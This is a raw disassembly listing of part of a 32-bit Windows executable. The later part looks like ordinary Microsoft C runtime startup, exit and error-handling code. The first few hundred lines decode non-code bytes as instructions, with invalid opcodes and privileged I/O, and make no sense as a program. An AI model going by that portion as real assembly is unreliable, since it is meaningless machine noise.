  4226f7:	outs   dx,DWORD PTR ds:[esi]
  4226f8:	xlat   BYTE PTR ds:[ebx]
  4226f9:	sub    eax,ecx
  4226fb:	jecxz  0x4226d5
  4226fd:	cwde   
  4226fe:	pop    ebx
  4226ff:	push   ebp
  422700:	cli    
  422701:	out    0x51,al
  422703:	mul    DWORD PTR [edx+0x9ad5988]
  422709:	ds push edx
  42270b:	pop    edx
  42270c:	xor    ah,cl
  42270e:	jbe    0x422728
  422710:	in     eax,dx
  422711:	cmp    DWORD PTR [edx+edi*1],ebx
  422714:	mov    edi,0x1afad877
  422719:	adc    cl,0xab
  42271c:	cld    
  42271d:	ss pop eax
  42271f:	mov    eax,ds:0x8ab8f558
  422724:	repnz leave 
  422726:	icebp  
  422727:	sub    edx,eax
  422729:	inc    esp
  42272a:	pushw  ss
  42272c:	or     dl,BYTE PTR [ebp+0x40]
  42272f:	dec    ebp
  422730:	lds    edi,FWORD PTR [eax]
  422732:	and    edx,DWORD PTR [eax]
  422734:	call   0xffa8:0xa3ab9fe2
  42273b:	retf   
  42273c:	push   esi
  42273d:	cwde   
  42273e:	and    dh,BYTE PTR [esi]
  422740:	scas   al,BYTE PTR es:[edi]
  422741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422742:	std    
  422743:	sbb    BYTE PTR [edi-0x4a95506a],cl
  422749:	call   0x668e780b
  42274e:	jne    0x422777
  422750:	jle    0x422755
  422752:	(bad)  
  422753:	fsub   st(4),st
  422755:	rcl    BYTE PTR [edi+ecx*2-0x5dfd2964],0x31
  42275d:	inc    esp
  42275e:	jle    0x422705
  422760:	into   
  422761:	shr    BYTE PTR [ecx],cl
  422763:	out    0x45,al
  422765:	fwait
  422766:	sub    BYTE PTR [ecx-0x356555d2],al
  42276c:	adc    al,0x21
  42276e:	scas   eax,DWORD PTR es:[edi]
  42276f:	repnz or DWORD PTR [eax+0x2a152668],esp
  422776:	scas   al,BYTE PTR es:[edi]
  422777:	rcr    DWORD PTR [esi+0x3],cl
  42277a:	lods   eax,DWORD PTR ds:[esi]
  42277b:	jbe    0x42278a
  42277d:	xor    eax,0xfcee31c6
  422782:	enter  0xd22a,0x10
  422786:	mov    eax,ds:0xfa281404
  42278b:	pop    ds
  42278c:	jb     0x422796
  42278e:	xor    al,0x78
  422790:	test   al,0xc5
  422792:	jecxz  0x42277a
  422794:	dec    ebp
  422795:	js     0x42277b
  422797:	pop    esp
  422798:	je     0x422721
  42279a:	mov    dh,0x1a
  42279c:	data16 ja 0x42275a
  42279f:	jle    0x422779
  4227a1:	(bad)
  4227a4:	mov    dl,0x9b
  4227a6:	jb     0x42281f
  4227a8:	out    0x75,eax
  4227aa:	dec    esi
  4227ab:	adc    dh,bl
  4227ad:	out    0xc,al
  4227af:	repz jnp 0x422793
  4227b2:	sbb    al,0xa5
  4227b4:	stos   DWORD PTR es:[edi],eax
  4227b5:	jle    0x4227a7
  4227b7:	pop    esi
  4227b8:	retf   
  4227b9:	sahf   
  4227ba:	pop    eax
  4227bb:	dec    esp
  4227bc:	inc    edx
  4227bd:	add    al,0x56
  4227bf:	lahf   
  4227c0:	xchg   edi,eax
  4227c1:	cmp    DWORD PTR [edx-0x46],esp
  4227c4:	daa    
  4227c5:	pop    esi
  4227c6:	sub    BYTE PTR [eax+0x1],bl
  4227c9:	sub    BYTE PTR [edi],bl
  4227cb:	pop    ebx
  4227cc:	push   ebx
  4227cd:	pop    es
  4227ce:	aam    0x7e
  4227d0:	mov    edx,0xe2d4984c
  4227d5:	sub    dh,BYTE PTR [edx]
  4227d7:	mov    ecx,0xbe5e1916
  4227dc:	inc    edi
  4227dd:	push   ecx
  4227de:	and    DWORD PTR [esp+eax*8-0x9],ebp
  4227e2:	adc    ecx,ebx
  4227e4:	in     eax,dx
  4227e5:	pushf  
  4227e6:	fistp  QWORD PTR [ebx-0x9d0e174]
  4227ec:	and    al,BYTE PTR [ecx-0x34]
  4227ef:	or     eax,DWORD PTR [edx]
  4227f1:	mov    al,ds:0xfcdec9c0
  4227f6:	xchg   esp,eax
  4227f7:	js     0x422818
  4227f9:	sbb    esp,DWORD PTR [ecx]
  4227fb:	(bad)  
  4227fc:	cmp    BYTE PTR [edi],al
  4227fe:	lods   al,BYTE PTR ds:[esi]
  4227ff:	repnz inc esi
  422801:	mov    esp,0xd88d5801
  422806:	jle    0x422816
  422808:	pop    esp
  422809:	push   0xa359c964
  42280e:	sti    
  42280f:	mov    dl,0x9e
  422811:	pop    ebx
  422812:	xchg   ebp,eax
  422813:	xchg   edi,eax
  422814:	jmp    edx
  422816:	push   ebx
  422817:	mov    ebx,0xb0b113bc
  42281c:	mov    eax,0x4926710f
  422821:	out    0xe8,eax
  422823:	xchg   al,ch
  422825:	ret    0xe35a
  422828:	and    ax,0xc8ad
  42282c:	sub    bh,BYTE PTR [esi]
  42282e:	(bad)  
  42282f:	adc    ah,bl
  422831:	mov    DWORD PTR [eax],eax
  422833:	loope  0x4227d9
  422835:	test   eax,ecx
  422837:	pop    ecx
  422838:	fild   DWORD PTR [esi+0x2394a71a]
  42283e:	sbb    al,0x47
  422840:	ss cmp eax,0xf11e6110
  422846:	rcr    BYTE PTR [ebx],1
  422848:	push   ebx
  422849:	rcr    BYTE PTR [edx-0x9],1
  42284c:	mov    ch,0xb
  42284e:	sub    al,0x64
  422850:	and    esp,edx
  422852:	aaa    
  422853:	cld    
  422854:	mov    edi,DWORD PTR [ecx+0x58]
  422857:	(bad)  
  422858:	daa    
  422859:	pop    esp
  42285a:	fstp   DWORD PTR [ebx-0x7a]
  42285d:	jo     0x422885
  42285f:	in     al,0xd7
  422861:	adc    BYTE PTR [esi+0x51],0xe7
  422865:	scas   eax,DWORD PTR es:[edi]
  422866:	mov    ah,0x5c
  422868:	(bad)  
  422869:	xor    BYTE PTR [ebx+0x19],bh
  42286c:	and    al,0xdc
  42286e:	mov    ?,WORD PTR [esi+edx*2+0x24]
  422872:	jecxz  0x4228e6
  422874:	retf   
  422875:	jmp    0x42288e
  422877:	shl    DWORD PTR [ebx+0x4f],cl
  42287a:	ja     0x422884
  42287c:	inc    ebx
  42287d:	cs or  eax,0x17395c6b
  422883:	mov    ch,0x91
  422885:	add    eax,eax
  422887:	xchg   ebx,ebp
  422889:	popa   
  42288a:	(bad)  
  42288b:	out    dx,al
  42288c:	fmul   QWORD PTR [esi+0x71274498]
  422892:	pop    edi
  422893:	mov    ds:0x5fd75874,eax
  422898:	dec    ecx
  422899:	push   eax
  42289a:	push   0xa761aea9
  42289f:	push   cs
  4228a0:	leave  
  4228a1:	fwait
  4228a2:	iret   
  4228a3:	dec    edx
  4228a4:	scas   eax,DWORD PTR es:[edi]
  4228a5:	jno    0x42285b
  4228a7:	pop    edi
  4228a8:	push   ds
  4228a9:	cmp    eax,0xe1315db4
  4228ae:	push   ss
  4228af:	mov    cl,0x26
  4228b1:	mov    al,ds:0x13858515
  4228b6:	mov    ebp,0xd0654bac
  4228bb:	mov    ebx,0xa1886981
  4228c0:	shl    DWORD PTR [edi-0x5f],cl
  4228c3:	mov    ebp,0x19cd4c8f
  4228c8:	push   ebp
  4228c9:	mov    edx,0x522d2974
  4228ce:	clc    
  4228cf:	dec    ebx
  4228d0:	push   edx
  4228d1:	jae    0x4228a8
  4228d3:	pop    ecx
  4228d4:	push   ss
  4228d5:	stos   DWORD PTR es:[edi],eax
  4228d6:	mov    cl,0x19
  4228d8:	imul   ecx
  4228da:	xlat   BYTE PTR ds:[ebx]
  4228db:	sub    al,0x29
  4228dd:	xor    BYTE PTR [edi+ecx*2],cl
  4228e0:	fistp  QWORD PTR [edi]
  4228e2:	stos   BYTE PTR es:[edi],al
  4228e3:	push   esi
  4228e4:	data16 aaa 
  4228e6:	test   eax,0xe2f6e019
  4228eb:	pop    es
  4228ec:	repz push ecx
  4228ee:	jmp    0x1100:0xd86f4bc8
  4228f5:	ins    BYTE PTR es:[edi],dx
  4228f6:	out    0x8e,eax
  4228f8:	adc    al,0xac
  4228fa:	dec    ebx
  4228fb:	outs   dx,BYTE PTR ds:[esi]
  4228fc:	test   eax,edx
  4228fe:	int    0xfe
  422900:	push   ss
  422901:	int    0x3f
  422903:	adc    al,0xdf
  422905:	sub    DWORD PTR [ecx],ebx
  422907:	sar    DWORD PTR [ecx],0xa4
  42290a:	or     DWORD PTR [ebp+0x3a],0x79
  42290e:	cmp    edi,ecx
  422910:	ret    
  422911:	push   es
  422912:	mov    dh,0xc9
  422914:	push   edx
  422915:	jl     0x4228f3
  422917:	add    eax,ebx
  422919:	mov    edi,0xa477a68
  42291e:	jp     0x4228d0
  422920:	ficom  DWORD PTR [ecx]
  422922:	sbb    eax,0xc1bf948b
  422927:	mov    esp,0x7461a6ba
  42292c:	and    dl,cl
  42292e:	leave  
  42292f:	dec    ebx
  422930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422931:	jno    0x42292f
  422933:	gs out 0xa9,eax
  422936:	cmp    eax,0xeb03796c
  42293b:	in     al,dx
  42293c:	pop    edi
  42293d:	clc    
  42293e:	dec    ecx
  42293f:	(bad)  [esi-0x2]
  422942:	jns    0x4228e9
  422944:	ins    BYTE PTR es:[edi],dx
  422945:	loop   0x42299b
  422947:	(bad)  
  422948:	jns    0x422982
  42294a:	mov    esi,0xaf8a90e8
  42294f:	(bad)
  422954:	pop    eax
  422955:	jl     0x4229af
  422957:	xor    eax,0xc0334b79
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
